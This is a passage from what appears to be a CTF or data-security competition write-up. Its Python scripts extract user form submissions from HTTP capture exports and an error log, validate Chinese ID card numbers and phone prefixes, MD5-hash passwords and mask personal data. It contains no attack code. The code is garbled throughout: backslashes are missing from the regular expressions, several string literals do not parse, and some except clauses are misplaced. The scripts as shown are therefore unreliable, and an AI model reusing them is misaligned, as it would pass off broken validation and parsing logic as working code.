        field = identify_field(value)
        if field in field_map:
            field_map[field] = value
        else:
            field_map[field] = value

    # 根据给定顺序生成排序后的列表
    ordered_row = [field_map.get(field, '') for field in field_order]
    return ordered_row

# 读取CSV文件并重新排序
def read_and_reorder_csv(file_path):
    with open(file_path, mode='r', encoding='utf-8') as file:
        csv_reader = csv.reader(file)
        header = next(csv_reader)  # 读取表头
        print(f'Original Header: {header}')
        
        # 打印重新排序后的表头
        print(f'Ordered Header: {field_order}')
        
        with open('result.csv', 'w', encoding='utf-8', newline='') as fp:
            csv_writer = csv.writer(fp)
            csv_writer.writerow(field_order)    # 写入表头
            for row in csv_reader:
                ordered_row = reorder_row_by_type(row)
                csv_writer.writerow(ordered_row)    # 写入数据
                # print(ordered_row)

# 调用函数，读取指定路径的CSV文件并排序
file_path = 'person_data.csv'  # 请将此处的路径替换为你要读取的CSV文件的路径
read_and_reorder_csv(file_path)
import json

post_list = json.load(open('post.json', encoding='utf-8'))

true_list = []

for l in post_list:
    try:
        http_post_data = l['_source']['layers']['http']['http.unknown_header']
        # print(json.loads(http_post_data))
        true_list.append(json.loads(http_post_data))
    
except:
        pass

with open('only_data.json', 'w+') as fp:
    json.dump(true_list, fp)
import re
import csv
import json
from datetime import datetime

fake_phone_prefixes = [
    734, 735, 736, 737, 738, 739, 747, 748, 750, 751, 752, 757, 758, 759, 772,
    778, 782, 783, 784, 787, 788, 795, 798, 730, 731, 732, 740, 745, 746, 755,
    756, 766, 767, 771, 775, 776, 785, 786, 796, 733, 749, 753, 773, 774, 777,
    780, 781, 789, 790, 791, 793, 799
]
str_fake_phone_prefixes = [str(i) for i in fake_phone_prefixes]
# print(str_fake_phone_prefixes)

# 定义身份证号校验码对照表
check_code_map = {
    0: '1',
    1: '0',
    2: 'X',
    3: '9',
    4: '8',
    5: '7',
    6: '6',
    7: '5',
    8: '4',
    9: '3',
    10: '2'
}

# 系数列表
coefficients = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]

only_data = json.load(open('only_data.json', encoding='utf-8'))

region_id_list = json.load(open('region_id.json', encoding='utf-8'))

def validate_idcard(idcard):
    # 检查身份证号长度
    if len(idcard) != 18:
        return False
    
    if not re.fullmatch(r'd{17}[dX]', idcard):
        return False

    # 提取前17位数字部分
    idcard_digits = idcard[:17]
    
    # 检查前17位是否全为数字
    if not idcard_digits.isdigit():
        return False

    # 计算加权和
    total_sum = sum(int(idcard_digits[i]) * coefficients[i] for i in range(17))
    
    # 计算余数
    remainder = total_sum % 11
    
    # 获取对应的校验码
    check_code = check_code_map[remainder]

    # 校验最后一位是否匹配
    return check_code == idcard[-1]

def validate_data(data):
    errors = []

    # 1. 验证 username
    if len(data['username']) == 1:
        errors.append('username len must larger than 1.')
    if not re.fullmatch(r'[a-zA-Z0-9]+', data['username']):
        errors.append('username contains invalid characters.')

    # 2. 验证 name
    if not re.fullmatch(r'[u4e00-u9fff]+', data['name']):
        errors.append('name contains invalid characters.')

    # 3. 验证 sex
    if data['sex'] not in ['男', '女']:
        errors.append('sex is invalid.')
    else:
        id_sex_digit = int(data['idcard'][-2])  # 身份证号倒数第二位
        if (id_sex_digit % 2 == 1 and data['sex'] != '男') or (id_sex_digit % 2 == 0 and data['sex'] != '女'):
            errors.append('sex does not match the idcard.')

    # 4. 验证 birth
    if not re.fullmatch(r'd{8}', data['birth']):
        errors.append('birth must be 8 digits.')
    else:
        try:
            birth_date = datetime.strptime(data['birth'], "%Y%m%d")
        
except ValueError:
            errors.append('birth is not a valid date.')
            exit()
        else:
            id_birth = data['idcard'][6:14]  # 身份证中的出生日期
            if data['birth'] != id_birth:
                errors.append('birth does not match the idcard.')
            elif birth_date > datetime.now():
                errors.append('birth cannot be a future date.')
                
    # 5. 验证 idcard
    if not validate_idcard(data['idcard']):
        errors.append('idcard is invalid.')

    # 6. 验证 phone
    if len(data['phone']) != 11:
        errors.append('phone must be 11 digits.')
    
    if data['phone'][:3] not in str_fake_phone_prefixes:
        errors.append('phone uses a fake prefix.')

    if errors:
        # print(f'[-] {data} --- {errors}')
        if '\' in data['username']:
            print(f'[-] {data} --- {errors}')
        return False
    else:
        return True

finame = ['username', 'name', 'sex', 'birth', 'idcard', 'phone']
with open('invalid.csv', 'a+', encoding='utf-8', newline='') as fp:
    csv_data = csv.DictWriter(fp, finame)
    csv_data.writeheader()

    for data in only_data:
        if validate_data(data):
            pass
        else:
            csv_data.writerow(data)
import re
import json
from urllib.parse import unquote

def parse_query_string(query_string):
    # Define the regular expression pattern for key-value pairs
    pattern = r'(w+)=([^&]+)'
    
    # Find all matches in the query string
    matches = re.findall(pattern, query_string)
    
    # Create a dictionary to hold the key-value pairs
    result = {}
    
    for key, value in matches:
        # URL decode the value to handle encoded characters
        result[key] = unquote(value)
    
    return result

def hex_escape_to_chinese(hex_escape_str):
    # 使用正则表达式提取十六进制转义的字节
    hex_bytes = re.findall(r'\x([0-9a-fA-F]{2})', hex_escape_str)
    
    # 将提取的十六进制字节转换为字节对象
    byte_array = bytes(int(byte, 16) for byte in hex_bytes)
    
    # 解码字节对象为 UTF-8 字符串
    return byte_array.decode('utf-8')

with open('error.log', 'rb') as fp:
    error_log_list = fp.readlines()

valid_data_list = []

for log_index in range(len(error_log_list)):
    # 定位 Content-Type: application/x-www-form-urlencoded 并筛选过滤
    if b'Content-Type: application/x-www-form-urlencoded' in error_log_list[log_index]:
        # print(error_log_list[i:i+15])
        
        item = {}
        for _ in error_log_list[log_index:
log_index+15]:
            # 请求体
            if 'username' in str(_):
                req = parse_query_string(str(_).replace('\n'', ''))
                # print(req)
            # 响应体
            if '\x' in str(_):
                try:
                    # 有密码
                    rep = re.findall(r'data-HEAP):s(.*?): (.*?)\n', _.decode())
                    rep = hex_escape_to_chinese(rep[0][0]) + ': ' + rep[0][1]
                
except:
                    rep = re.findall(r'data-HEAP):s(.*?)\n', _.decode())[0]
                    rep = hex_escape_to_chinese(rep)

        item = {
            'requests': req,
            'response': rep
        }
        # print(item)
        valid_data_list.append(item)

with open('valid_data.json', 'w+') as fp:
    json.dump(valid_data_list, fp)
import re
import csv
import json
from datetime import datetime

valid_data_item = json.load(open('valid_data.json', encoding='utf-8'))

response_set = list()
for valid_data in valid_data_item:
    response_set.append(valid_data['response'])

print(set(response_set))

# {'您的信息录入成功！', '您输入的用户名不存在！', '您的信息更新成功！'}
import re
import csv
import json
import hashlib
from datetime import datetime

valid_data_item = json.load(open('valid_data.json', encoding='utf-8'))

# 创建一个大的字典，用来模拟数据的创建和更新
final_item = []

for data in valid_data_item:
    if '您的信息录入成功' in data['response']:
        password = hashlib.md5((data['response'].split(':')[-1].strip()).encode()).hexdigest()  # 提取密码->md5
        user_insert_item = {
            "username": data['requests']['username'],
            "password": password,
            "name": data['requests']['name'],
            "idcard": data['requests']['idcard'],
            "phone": data['requests']['phone']
        }
        final_item.append(user_insert_item)
    if '您的信息更新成功' in data['response']:
        # 更新的话，需要先从final_item找到原先的字典，再进行更新
        for first_index in range(len(final_item)):
            if final_item[first_index]['username'] == data['requests']['username']:
                print(f"[+] 找到原先存储的数据，更新! {data['requests']['username']}")
                final_item[first_index]['username'] = data['requests']['username']
                final_item[first_index]['password'] = hashlib.md5((data['response'].split(':')[-1].strip()).encode()).hexdigest()
                final_item[first_index]['name'] = data['requests']['name']
                final_item[first_index]['idcard'] = data['requests']['idcard']
                final_item[first_index]['phone'] = data['requests']['phone']

with open('user_item.json', 'w+') as fp:
    json.dump(final_item, fp)
import re
import csv
import json
from datetime import datetime

fake_phone_prefixes = [
    734, 735, 736, 737, 738, 739, 747, 748, 750, 751, 752, 757, 758, 759, 772,
    778, 782, 783, 784, 787, 788, 795, 798, 730, 731, 732, 740, 745, 746, 755,
    756, 766, 767, 771, 775, 776, 785, 786, 796, 733, 749, 753, 773, 774, 777,
    780, 781, 789, 790, 791, 793, 799
]
str_fake_phone_prefixes = [str(i) for i in fake_phone_prefixes]
# print(str_fake_phone_prefixes)

# 定义身份证号校验码对照表
check_code_map = {
    0: '1',
    1: '0',
    2: 'X',
    3: '9',
    4: '8',
    5: '7',
    6: '6',
    7: '5',
    8: '4',
    9: '3',
    10: '2'
}

# 系数列表
coefficients = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]

only_data = json.load(open('user_item.json', encoding='utf-8'))

def validate_idcard(idcard):
    # 检查身份证号长度
    if len(idcard) != 18:
        return False

    if not re.fullmatch(r'd{17}[dX]', idcard):
        return False

    # 提取前17位数字部分
    idcard_digits = idcard[:17]

    # 检查前17位是否全为数字
    if not idcard_digits.isdigit():
        return False

    # 计算加权和
    total_sum = sum(int(idcard_digits[i]) * coefficients[i] for i in range(17))

    # 计算余数
    remainder = total_sum % 11

    # 获取对应的校验码
    check_code = check_code_map[remainder]

    # 校验最后一位是否匹配
    return check_code == idcard[-1]

def validate_data(data):
    errors = []

    # 1. 验证 username
    if len(data['username']) == 1:
        errors.append('username len must larger than 1.')
    if not re.fullmatch(r'[a-zA-Z0-9]+', data['username']):
        errors.append('username contains invalid characters.')

    # 2. 验证 name
    if not re.fullmatch(r'[u4e00-u9fff]+', data['name']):
        errors.append('name contains invalid characters.')

    # 5. 验证 idcard
    if not validate_idcard(data['idcard']):
        errors.append('idcard is invalid.')

    # 6. 验证 phone
    if len(data['phone']) != 11:
        errors.append('phone must be 11 digits.')

    if data['phone'][:3] not in str_fake_phone_prefixes:
        errors.append('phone uses a fake prefix.')

    if errors:
        # print(f'[-] {data} --- {errors}')
        if '\' in data['username']:
            print(f'[-] {data} --- {errors}')
        return False
    else:
        return True

def desensitize_data(data):
    # 1. 脱敏 username
    username = data['username']
    if len(username) == 2:
        desensitized_username = username[0] + '*'
    else:
        desensitized_username = username[0] + 
            '*' * (len(username) - 2) + username[-1]

    # 2. password 不需要处理
    password = data['password']

    # 3. 脱敏 name
    name = data['name']
    if len(name) == 2:
        desensitized_name = name[0] + '*'
    else:
        desensitized_name = name[0] + '*' * (len(name) - 2) + name[-1]

    # 4. 脱敏 idcard
    idcard = data['idcard']
    year = idcard[6:10]
    desensitized_idcard = '*' * 6 + year + '*' * (len(idcard) - 10)

    # 5. 脱敏 phone
    phone = data['phone']
    desensitized_phone = phone[:3] + '*' * 4 + phone[7:]

    return {
        'username': desensitized_username,
        'password': password,
        'name': desensitized_name,
        'idcard': desensitized_idcard,
        'phone': desensitized_phone
    }

finame = ['username', 'password', 'name', 'idcard', 'phone']
with open('valid.csv', 'a+', encoding='utf-8', newline='') as fp:
    csv_data = csv.DictWriter(fp, finame)
    csv_data.writeheader()

    for data in only_data:
        if validate_data(data):
            # 脱敏操作
            data = desensitize_data(data)
            csv_data.writerow(data)
        else:
            pass
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/5-1724924622.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/9-1724924623.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/4-1724924624.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/3-1724924624.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/7-1724924625.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/7-1724924626.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/8-1724924627.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/8-1724924630.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/5-1724924631.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/08/0-1724924632.png)